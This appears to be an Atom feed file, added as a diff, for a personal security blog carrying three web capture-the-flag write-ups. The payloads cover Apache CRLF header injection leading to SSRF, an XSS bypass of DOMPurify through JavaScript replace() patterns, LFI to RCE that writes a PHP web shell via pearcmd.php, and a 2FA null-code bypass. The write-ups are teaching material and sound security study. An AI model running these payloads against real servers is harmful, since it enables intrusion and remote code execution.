@@ -1,0 +1,385 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Stinger</title>
+  <subtitle>Mohamed Goudam's Personal Blog</subtitle>
+  <link href="https://mohamed-goodv.github.io/" rel="alternate" type="text/html"/>
+  <link href="https://mohamed-goodv.github.io/atom.xml" rel="self" type="application/atom+xml"/>
+  <id>https://mohamed-goodv.github.io/</id>
+  <updated>2026-05-26T20:05:31.686Z</updated>
+  <language>en</language>
+  <entry>
+    <title>Auditor</title>
+    <link href="https://mohamed-goodv.github.io/posts/audito/auditor/" rel="alternate" type="text/html"/>
+    <id>https://mohamed-goodv.github.io/posts/audito/auditor/</id>
+    <published>2026-05-26T00:00:00.000Z</published>
+    <updated>2026-05-26T00:00:00.000Z</updated>
+    <summary>Web cahllenge</summary>
+    <content type="html"><![CDATA[<p>when we see the source code</p>
+<p>we will find in this section that he get the <code>debug_token</code> and <code>charset</code> from the user by a click</p>
+<pre><code>fmt.Printf(`
+    &lt;tr&gt;
+        &lt;td&gt;%s&lt;/td&gt;
+        &lt;td&gt;%s&lt;/td&gt;
+        &lt;td&gt;&lt;span class="status-%s"&gt;%s&lt;/span&gt;&lt;/td&gt;
+        &lt;td&gt;%s&lt;/td&gt;
+        &lt;td&gt;&lt;a href="/sync_audit?debug_token=%s&amp;charset=utf-8"&gt;Audit&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+</code></pre>
+<p>then we will search what he is doing with these</p>
+<p>we will find this in the <code>sync_audit :</code></p>
+<pre><code>token := query.Get("debug_token")
+	if token == "" {
+		token = "NO_TOKEN"
+	}
+    fmt.Printf("X-Debug-Audit-Token: %s\\n", html.EscapeString(token))
+
+    charset := query.Get("charset")
+    if charset == "" {
+        charset = "utf-8" 
+    }
+    fmt.Printf("Content-Type: text/html; charset=%s\\n", charset)
+</code></pre>
+<p>it get the <code>devug_token</code> and pass it to <code>html.escape</code> to remove any issue vuln</p>
+<p>but he pass the <code>charset</code> directly to the content-Type header</p>
+<p>so we can try to make <code>CRLF</code> injection</p>
+<p>when i tried this :</p>
+<pre><code>debug_token=8774-A&amp;charset=utf-8%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><img src="./image2.png" alt="" /></p>
+<hr />
+<p>so we now can make <code>CRLF</code> we now want to read the flag from the internal server so we will Try to make <code>SSRF</code>with the new header</p>
+<p>we Found that the <code>apache/2.4.58</code></p>
+<p>so we will try to search about SSRF with this version :</p>
+<pre><code>key word was : ssrf via header injection apache/2.4.58 exploit 
+</code></pre>
+<hr />
+<p>We will find this blog</p>
+<p><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%F0%9F%94%A5-3-Handler-Confusion">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#🔥-3-Handler-Confusion</a></p>
+<p>In the section <strong><code>Handler Confusion</code> :</strong></p>
+<ul>
+<li><strong>when you want to use <code>mod_php</code> you must set <code>AddHandler</code> and <code>AddType</code></strong></li>
+<li>if the handler not exist the server uses the content-type as a handler</li>
+</ul>
+<hr />
+<p>But there is a Problem</p>
+<p>when you try to overwrite the <code>content-type</code> with a internal file we can’t</p>
+<p>because when we run the server the <code>content-type</code> set to <code>addtype</code> not handler and the server treat the frist states</p>
+<hr />
+<p>but we have another thing</p>
+<pre><code>&lt;Location /server-status&gt;
+    SetHandler server-status
+    Require all granted
+&lt;/Location&gt;
+</code></pre>
+<p>if we can control with the <code>location</code> header the configration of the server if we set the <code>location</code> header with <code>/</code> and the response of the server was <code>200 OK</code> the server must make a new request with this <code>/anything</code> in the location header</p>
+<p>and make a request with the <code>content-type</code> of the original request</p>
+<p>in this scenario when the new request send the <code>content-type</code>set to handler</p>
+<p>and we can use with it something like <code>mod_proxy</code> that request an internal request by <code>X-Forwarded-For</code></p>
+<p>so we want to set the request like that :</p>
+<pre><code>location :/any-thing 
+content-Type :proxy:&lt;http://127.0.0.1:5000&gt;
+</code></pre>
+<p>so our payload will be :</p>
+<pre><code>?debug_token=8774-A&amp;charset=%0ALocation%3A%20%2Ffooo%0AContent-Type%3A%20proxy%3Ahttp%3A%2F%2F127.0.0.1%3A5000
+</code></pre>
+<p><img src="./image.png" alt="" /></p>
+]]></content>
+    <author>
+      <name>Stinger</name>
+    </author>
+    <category term="CTF"></category>
+  </entry>
+  <entry>
+    <title>CAT CTF 26 — Entry Level</title>
+    <link href="https://mohamed-goodv.github.io/posts/cat-ctf-26/" rel="alternate" type="text/html"/>
+    <id>https://mohamed-goodv.github.io/posts/cat-ctf-26/</id>
+    <published>2026-03-25T00:00:00.000Z</published>
+    <updated>2026-03-25T00:00:00.000Z</updated>
+    <summary>Writeup for CAT CTF 26 Entry Level challenges</summary>
+    <content type="html"><![CDATA[<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:695/1*FFUyRKJ5mb8AH0mfob6O0g.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#challenge-1--purified-xss">Challenge 1 — Purified? (XSS)</a></li>
+<li><a href="#challenge-2--lfi-to-rce-php">Challenge 2 — LFI to RCE (PHP)</a></li>
+</ul>
+<p>Let’s not waste time and let’s go :</p>
+<h2>Challenge 1 — Purified? (XSS)</h2>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:484/1*l0vhY3PxigbpyfFWxqDIlA.png" alt="" /></p>
+<p>&lt;/div&gt;
+When we open the challenge link we will find Notes section and Report link</p>
+<p>Press enter or click to view image in full size
+&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*bkEO7ZcBMFU-ARaDd2DFnQ.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<p>When i tried basic payload such a <code>&lt;scritp&gt;alert(1)&lt;/script&gt;</code> and <code>&lt;svg/onload=alert(1)&gt;</code><br />
+it give me like that in the source code</p>
+<pre><code>&lt;svg&gt;&lt;/svg&gt;
+</code></pre>
+<p>so that make me know it filtered <strong>script tag</strong> and any <strong>event handler</strong></p>
+<p>so this time to see the source code</p>
+<p>server.js :</p>
+<pre><code>const express = require('express');  
+const createDOMPurify = require('dompurify');  
+const { JSDOM } = require('jsdom');  
+const window = new JSDOM('').window;  
+const DOMPurify = createDOMPurify(window);  
+const app = express();  
+const port = Number(process.env.PORT || 5000);  
+const botVisitUrl = process.env.BOT_VISIT_URL || 'http://bot:3000/visit';
+</code></pre>
+<hr />
+<pre><code>function renderPage(rawContent = '', reportMessage = '') {  
+const cleanContent = DOMPurify.sanitize(rawContent);  
+let noteHtml = '';  
+if (cleanContent) {  
+noteHtml = `&lt;div class="note"&gt;&lt;b&gt;Your Note:&lt;/b&gt;&lt;br&gt;${cleanContent}&lt;/div&gt;`;  
+}  
+const reportHtml = reportMessage ? `&lt;div class="msg"&gt;${reportMessage}&lt;/div&gt;` : '';  
+return PAGE_TEMPLATE  
+.replace('{{NOTE_SECTION}}', noteHtml)  
+.replace('{{REPORT_MESSAGE}}', reportHtml);  
+}
+</code></pre>
+<p>When i see <strong>Dompurify</strong> and i was have <strong>package.json</strong> file i go to search a exploit to this and how to bypass<br />
+i was spend like 2 hours in this scenario with no progress<br />
+and that learn me you must complete reading the source code</p>
+<p>we will note in the <strong>renderPage</strong> function it use <strong>replace</strong></p>
+<p>after a said what i do let’s learn more about replace function<br />
+The <code>**replace()**</code> method of <code>[String](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String)</code> values returns a new string with one, some, or all matches of a <code>pattern</code> replaced by a <code>replacement</code>. The <code>pattern</code> can be a string or a <code>RegExp</code></p>
+<p>example :</p>
+<pre><code>const x = "a";  
+const y = x.replace("a","b");  
+console.log(y); // b
+</code></pre>
+<hr />
+<pre><code>const paragraph = "I LOVE Java scirpt ";  
+console.log(paragraph.replace("LOVE", "Hate"));  
+// i Hate java script
+</code></pre>
+<p>Ok that’s nice next in the pattern we have special replacement patterns :</p>
+<p>Press enter or click to view image in full size
+&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*WPrTO8LVU0FTCc6_48mcEA.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<pre><code>const x = "aaaB"  
+x.replace("B","1$'2")  
+'aaa12'  
+x.replace("B","1$`2")  
+'aaa1aaa2'
+</code></pre>
+<p>if you want to learn more about replace function :</p>
+<h2>String.prototype.replace() - JavaScript | MDN</h2>
+<h3>The replace() method of String values returns a new string with one, some, or all matches of a pattern replaced by a…</h3>
+<h4><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace?source=post_page-----e369bf8d16f2---------------------------------------#description">developer.mozilla.org</a></h4>
+<p>so we can use this payload</p>
+<pre><code>&lt;img src="abc123$`&lt;img src=x onerror=alert(1)&gt;" /&gt;
+
+</code></pre>
+<p>Press enter or click to view image in full size
+&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*0tfwVTy2BAIHgucfCCfQ5Q.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<p>some edits and add your webhook you will come up with this :</p>
+<p>Press enter or click to view image in full size
+&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*y_dvvez3xDN-ZnYm0te_4Q.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<p>When i searched i found the same scenario at <code>0ctf</code> you can look at it</p>
+<h2>0ctf 2025 - ezmd - 5 solves</h2>
+<h3>Recommended: Full video write-up</h3>
+<h4><a href="https://cyber-man.pl/0ctf-2025-ezmd-web?source=post_page-----e369bf8d16f2---------------------------------------">cyber-man.pl</a></h4>
+<hr />
+<h2>Challenge 2 — LFI to RCE (PHP)</h2>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:475/1*9tLJ6SopeWKZVlGmbifhfw.png" alt="" /></p>
+<p>&lt;/div&gt;
+when we opened the challenge we found this source code</p>
+<pre><code>&lt;?php  
+$file = $_GET['file'] ?? null;  
+if ($file) {  
+    if (strpos($file, 'file://') === 0) {  
+        include($file);  
+    }  
+} else {  
+    highlight_file(__FILE__);  
+    }
+</code></pre>
+<p>That mean that we have only LFI but we want RCE</p>
+<p>First i tried this :</p>
+<pre><code>http://167.99.34.2:8888/?file=file:///var/www/html/flag.php
+
+</code></pre>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*A4tGuZTtRz8KAJfrKtVIfw.png" alt="" /></p>
+<p>&lt;/div&gt;
+i found PEAR_config</p>
+<p>so i used this keyword to search</p>
+<pre><code>rce via pear config file php
+</code></pre>
+<p>i found that we must check if the <code>pearcmd.php</code> found or not</p>
+<pre><code>http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php
+</code></pre>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*MLPrS8DhQJ_l0TE-4RVaIQ.png" alt="" /></p>
+<p>&lt;/div&gt;
+no error it’s exist</p>
+<p>then we will create RCE :</p>
+<pre><code>&lt;?= system($_GET[0];?&gt;
+</code></pre>
+<hr />
+<pre><code>http://167.99.34.2:8888/?file=file:///usr/local/lib/php/pearcmd.php&amp;+config-create+/%3C?=system($_GET[0]);?%3E+/tmp/shell.php
+</code></pre>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*gjAs8WSK0aj1HrHgIisDTw.png" alt="" /></p>
+<p>&lt;/div&gt;
+let’s try to get id :</p>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*3Eo62xJKbVQj-vTV0UM1UQ.png" alt="" /></p>
+<p>&lt;/div&gt;
+let’s read the flag :</p>
+<p>&lt;div align="center"&gt;</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*i4aLx73o7t0FthoDYfh0CQ.png" alt="" /></p>
+<p>&lt;/div&gt;</p>
+<pre><code>CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}
+</code></pre>
+<p>And that’s all, hope you find it well</p>
+]]></content>
+    <author>
+      <name>Stinger</name>
+    </author>
+    <category term="CTF"></category>
+  </entry>
+  <entry>
+    <title>Flags in the Air— Web CTF Challenge by connectors</title>
+    <link href="https://mohamed-goodv.github.io/posts/flag-in-the-air/" rel="alternate" type="text/html"/>
+    <id>https://mohamed-goodv.github.io/posts/flag-in-the-air/</id>
+    <published>2025-09-14T00:00:00.000Z</published>
+    <updated>2025-09-14T00:00:00.000Z</updated>
+    <summary>Web CTF Challenge by connectors</summary>
+    <content type="html"><![CDATA[<h2>بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ</h2>
+<p><img src="https://miro.medium.com/v2/resize:fit:526/1*1kct6CltfN3w_k-PVk7PcQ.png" alt="" /></p>
+<p>Source code Download from <a href="https://github.com/MushroomWasp/blog/blob/main/flags-in-the-air/FlagsInTheAir.zip">here</a></p>
+<p>The challenge was a login page without a registration page. The first thing I tried was injecting some SQLi payloads, but they all failed.</p>
+<p>After that, I opened the source code to look for leaked credentials, but I didn’t find anything.</p>
+<p>However, I noticed <strong>something</strong>. In <code>config.py</code>, there was a secret key: <code>a-very-secret-key</code>. The <code>Dockerfile</code> also <strong>had</strong> another secret key: <code>your-secret-key</code></p>
+<p>So I tried to generate a <strong>JWT</strong> token with admin credentials.</p>
+<p>in <code>auth.py</code></p>
+<pre><code>payload = {  
+        'exp': datetime.now(timezone.utc) + timedelta(hours=1),  
+        'iat': datetime.now(timezone.utc),  
+        'sub': username,  
+        =='access'====: access_level  
+    }==    ==return== ==jwt.encode(  
+        payload,  
+        current_app.config[===='SECRET_KEY'====],  
+        algorithm====='HS256'==    ==)==
+</code></pre>
+<p>That was the payload. So, I <strong>went</strong> to <code>jwt.io</code> and generated a token with full access.</p>
+<p>I then tried to go to the <code>/data</code> directory with the generated token, but I <strong>failed</strong>. I also tried it with 2FA access and <strong>failed</strong> again.</p>
+<p>Now, it’s time to analyze the source code,</p>
+<p>starting with the <code>/login</code> route in the <code>app.py</code> file.</p>
+<pre><code>@app.route('/login', methods=['GET', 'POST'])  
+def login():  
+    if request.method == 'GET':  
+        return render_template('login.html')  
+  
+    data = request.get_json()  
+  
+    username = data.get('username')  
+    password = data.get('password')  
+  
+    if username in TWO_FA_CODES:  
+        TWO_FA_CODES[username] = None  
+  
+    if USERS.get(username) == password:  
+        code = generate_2fa_code()  
+        TWO_FA_CODES[username] = code  
+          
+        token = generate_jwt(username, '2fa')  
+          
+        print(f"Generated 2FA code for {username}: {code}")  
+        return jsonify({"message": "2FA required", "token": token})  
+  
+    return jsonify({"message": "Invalid credentials"}), 401
+</code></pre>
+<p>First, it gets the username and checks if it exists in the <code>TWO_FA_CODES</code> dictionary. If it does, the code sets that 2fa value to <code>None</code>.</p>
+<p>After that, it checks if the provided password is valid and then generates a 2FA code,</p>
+<p>it <strong>doesn’t</strong> check <strong>if</strong> the username <strong>exists</strong> in the <code>USERS</code> table. So, I tried to <strong>enter</strong> a <strong>non-existent</strong> user with a null password to see what would happen.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*23h3m42_LgJq2pmYbR_bqw.png" alt="" /></p>
+<p>As you can see, it gave me the 2FA token.</p>
+<p>Next, I examined the <code>/verify-2fa</code> route</p>
+<pre><code>@app.route('/verify-2fa', methods=['GET', 'POST'])  
+def verify_2fa():  
+    if request.method == 'GET':  
+        return render_template('verify_2fa.html')  
+  
+    @token_required('2fa')  
+    def post_verify_2fa(current_user=None):  
+        data = request.get_json()  
+        code = data.get('code')  
+          
+        if not current_user:  
+            return jsonify({"message": "Auth token is missing!"}), 401  
+  
+        if TWO_FA_CODES.get(current_user) == code:  
+            del TWO_FA_CODES[current_user]  
+              
+            token = generate_jwt(current_user, 'full')  
+            return jsonify({"message": "Login successful!", "token": token})  
+  
+        return jsonify({"message": "Invalid 2FA code"}), 401  
+      
+    return post_verify_2fa()
+</code></pre>
+<p>This endpoint retrieves the 2FA code from the request data and compares it with the code stored in the <code>TWO_FA_CODES</code> dictionary for the current user. If they match, it deletes the 2FA code from the dictionary and generates a new JWT token with a 'full' access.</p>
+<p>So, in the <code>/verify-2fa</code> route, I tried to bypass it with many tricks, one of which was using a <strong>null</strong> value. When I tried this, it worked, but to be honest, that was just my luck! 😂</p>
+<p>I will now explain why this <strong>normally wouldn’t work</strong>.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*O8SxcXqG-H9e00w0MSkENA.png" alt="" /></p>
+<p>When I went back to the source code, I looked at the <code>/login</code> route again.</p>
+<p><a href="https://medium.com/write?source=promotion_paragraph---post_body_banner_better_place_scribble--c3a7b66f4398---------------------------------------"></a></p>
+<p>If the username exists, the code sets that user’s 2FA value to <code>None</code>, and if the password is correct, it generates a new token.</p>
+<p>This led me to wonder: what would happen if I entered an invalid password?</p>
+<p>So, I entered the correct username with a wrong password.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*y9PhnOknjohLtI9XcZ3sUA.png" alt="" /></p>
+<p>The 2FA value should set to <code>None</code>.</p>
+<p>So, we will try the <code>null</code> payload again, this time with the <code>code</code> parameter.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*grT4-yoYf9AX8GW8h1mlDQ.png" alt="" /></p>
+<p>It <strong>gave</strong> me <strong>a new</strong> token with full access and redirected me to the <code>/dashboard</code> page.</p>
+<p>This was a page that allowed for command execution,</p>
+<p>so I tried running the <code>ls</code> command.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*Z5NFk7xJZjRG40d_r0e8fg.png" alt="" /></p>
+<p>tried to get the flag in multiple ways, but I couldn’t.</p>
+<p>However, I remembered seeing a <strong>Dockerfile</strong> when I first looked through the source code.</p>
+<p>When I opened it, this is what I saw:</p>
+<pre><code>CMD sh -c "(while true; do echo '[DEBUG] healthcheck ok'; sleep 5; done) &amp; \  
+           (while true; do echo '[DEBUG] Flag{......}' &gt;&amp;1; sleep 10; done) &amp; \  
+           rm Dockerfile &amp;&amp; python app.py"
+</code></pre>
+<p>This line <strong>meant that</strong> the server <strong>echoes</strong> the flag every 10 <strong>seconds</strong>.</p>
+<p>I <strong>tried</strong> the <code>ps aux</code> command and anther commands, but they all <strong>failed</strong>. So, I passed the <strong>Dockerfile</strong> to an AI for help, and it <strong>gave</strong> me the following command:</p>
+<p>timeout 15 cat /proc/1/fd/1</p>
+<p>I didn’t know what this was, so I asked the AI to explain it to me:</p>
+<ul>
+<li><code>timeout 15</code>: This <strong>makes</strong> the <strong>following</strong> command <strong>execute</strong> for a 15 <strong>seconds</strong>.</li>
+<li><code>/proc/1/fd/1</code>: This is the file descriptor for <strong>standard output</strong> in Linux.</li>
+</ul>
+<p>So, this payload tells the server to <strong>capture</strong> the output from that file descriptor for up to 15 <strong>seconds</strong>.</p>
+<p>Press enter or click to view image in full size</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*MatWZigwXTTDuEwVwIeuJA.png" alt="" /></p>
+<p>— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —</p>
+<p>تم بحمد الله✨</p>
+]]></content>
+    <author>
+      <name>Stinger</name>
+    </author>
+    <category term="CTF"></category>
+  </entry>
+</feed>
